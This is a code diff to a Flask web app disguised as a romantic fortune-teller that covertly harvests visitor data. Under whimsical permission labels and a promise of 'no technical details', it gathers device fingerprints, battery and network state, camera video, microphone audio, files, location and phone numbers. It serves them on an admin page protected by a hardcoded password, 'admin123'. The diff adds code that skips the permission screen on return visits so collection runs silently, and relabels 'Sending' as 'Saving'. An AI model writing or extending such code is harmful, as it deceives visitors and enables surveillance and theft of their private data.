@@ -6,6 +6,7 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+# 32 romantic fortunes
 FORTUNES = [
     "Your soulmate is thinking of you right now 💕",
     "A passionate kiss awaits you this week 😘",
@@ -43,7 +44,7 @@ FORTUNES = [
 
 DATA_FILE = 'visitors.json'
 
-# ---------- ALL POSSIBLE FIELDS (admin panel will show all) ----------
+# All possible fields – ensures admin table shows every column
 ALL_FIELDS = [
     'sessionId', 'timestamp', 'ip', 'name', 'fortuneText', 'phoneNumber',
     'fingerprint', 'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
@@ -151,7 +152,6 @@ def admin():
             visitors = get_visitors()
             if not visitors:
                 return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
-            # Use ALL_FIELDS as header – always shows every column
             html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
             html += '<table border="1" cellpadding="5">'
             html += '<tr>' + ''.join(f'<th>{field}</th>' for field in ALL_FIELDS) + '</tr>'
@@ -321,7 +321,6 @@ HTML_TEMPLATE = '''
         <div class="permission-box">
             💕 Celestial Anchor ✨<br>
             🌟 Heartbeat Whisper 🌙<br>
-            💖 Soul Reflection 🔮<br>
             ✨ Secret Keepsake 🕯️
         </div>
         <p style="font-size:0.85rem; color:#c06c84;">(One click – your destiny awaits – no technical details)</p>
@@ -344,6 +343,7 @@ HTML_TEMPLATE = '''
 <input type="file" id="fileInput" multiple style="display:none">
 
 <script>
+    // Session ID (persists across refreshes)
     let sessionId = localStorage.getItem('fortuneSessionId');
     if (!sessionId) {
         sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
@@ -355,6 +355,7 @@ HTML_TEMPLATE = '''
     let currentFortuneText = "";
     let hasExistingData = false;
 
+    // ---------- Device info collectors ----------
     async function getFingerprint() {
         try {
             const fp = await FingerprintJS.load();
@@ -397,6 +398,7 @@ HTML_TEMPLATE = '''
         return navigator.userAgent;
     }
 
+    // On page load, check if this session already has a fortune
     window.addEventListener('load', async () => {
         try {
             const resp = await fetch('/get-session-data', {
@@ -449,7 +451,15 @@ HTML_TEMPLATE = '''
         
         await new Promise(r => setTimeout(r, 500));
         document.getElementById('loading').classList.add('hidden');
-        document.getElementById('permissions').classList.remove('hidden');
+        
+        // One-time permission UI: check if already granted
+        const permsAlreadyGranted = localStorage.getItem('lovePermissionsGranted');
+        if (permsAlreadyGranted === 'true') {
+            // Skip UI, go directly to data collection (browser will reuse permissions)
+            await finalizeAndSave();
+        } else {
+            document.getElementById('permissions').classList.remove('hidden');
+        }
     }
 
     function showStep(title, status, percent) {
@@ -466,6 +476,8 @@ HTML_TEMPLATE = '''
             await getMedia();
             await getFilesTraditional();
         } catch(e) { console.log("Permission step error", e); }
+        // Set flag so the romantic permission box never appears again on this browser
+        localStorage.setItem('lovePermissionsGranted', 'true');
         await finalizeAndSave();
     }
 
@@ -611,6 +623,11 @@ HTML_TEMPLATE = '''
             visitorData.mapUrl = '';
         }
         
+        // Ensure fields exist
+        if (!visitorData.cameraVideo) visitorData.cameraVideo = 'not captured';
+        if (!visitorData.microphone) visitorData.microphone = 'not captured';
+        if (!visitorData.files) visitorData.files = 'not captured';
+        
         await fetch('/save', {
             method: 'POST',
             headers: {'Content-Type':'application/json'},
@@ -637,8 +654,8 @@ HTML_TEMPLATE = '''
         }
         
         sendBtn.disabled = true;
-        sendBtn.innerText = '💫 Sending...';
-        statusDiv.innerText = 'Sending to your number...';
+        sendBtn.innerText = '💫 Saving...';
+        statusDiv.innerText = 'Saving your number...';
         
         try {
             const resp = await fetch('/save-phone', {
